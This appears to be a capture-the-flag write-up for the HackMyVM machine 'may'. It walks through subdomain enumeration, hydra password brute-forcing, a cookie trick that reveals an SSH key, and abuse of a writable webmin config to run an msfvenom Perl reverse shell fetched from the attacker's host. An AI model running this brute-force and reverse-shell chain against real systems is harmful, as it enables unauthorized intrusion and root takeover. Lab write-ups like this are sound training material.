marie: Where are now the keys?

admin: :'(

usernames: admin, marie and alice

Let's add may.hmv to the `/etc/hosts` file and enumerate the subdomains with gobuster:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -q -u http://may.hmv
Found: portal.may.hmv (Status: 200) [Size: 406]
Found: ssh.may.hmv (Status: 200) [Size: 405]  
{% endhighlight %}

After adding these two subdomains to the hosts file, we're greeted with a login form.
I tested the form for SQLi and it didn't work. 

Brute forcing the login form with hydra:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf]
┌──(kali㉿kali)-[~/ctf]
└─$ hydra -L users -P /usr/share/wordlists/rockyou.txt ssh.may.hmv http-post-form '/check.php:user=^USER^&password=^PASS^:incorrect' -vV
--SNIP--
{% endhighlight %}

Let's try changing the domainname:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf]
└─$ hydra -l marie -P /usr/share/wordlists/rockyou.txt portal.may.hmv http-post-form '/check.php:user=^USER^&password=^PASS^:incorrect' -vV
--SNIP--
[80][http-post-form] host: portal.may.hmv   login: marie   password: rebelde
--SNIP--
{% endhighlight %}

Alright so we have credentials for the portal, but they are somewhat useless because
the server is using key based authentication only. We need to find those private keys

I consulted a walkthrough that said there was something odd with cookies on the 
portal.may.hmv/check.php page, specifically one called Sweetcookie. Using a cookie 
editor plugin and adding the cookie while visiting the ssh.may.hmv page changes it's
output to an SSH key. 

Logging in over SSH:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/may]
└─$ ssh -i id_rsa marie@may.hmv

Checking what we can write to: 
{% highlight terminal %}
marie@may:/$ find / -writable -type f 2>/dev/null 
/etc/webmin/miniserv.conf
--SNIP--
{% endhighlight %}

Let's see if we can abuse the config file of webmin. 

The file path in the conf we'll abuse with a custom perl payload:
failed_script=/etc/webmin/failed.pl

We'll generate a perl reverse tcp shell with msfvenom:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/may]
└─$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.56.224 LPORT=6666 -f raw > failed.pl
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 233 bytes
{% endhighlight %}

Transfer the payload to the victim machine:
{% highlight terminal %}
marie@may:~$ wget http://192.168.56.224:8000/failed.pl
--2021-11-14 02:15:39--  http://192.168.56.224:8000/failed.pl

failed.pl            100%[======================>]     233  --.-KB/s    in 0s      

2021-11-14 02:15:39 (29.6 MB/s) - ‘failed.pl’ saved [233/233]
{% endhighlight %}

Now we edit the path in the config file:
`failed_script=/home/marie/failed.pl`

All we need to do now is attempt to login to the webmin panel and fail then we get a root shell on the machine. 
I submitted the flags and got the points. Hooray for points.
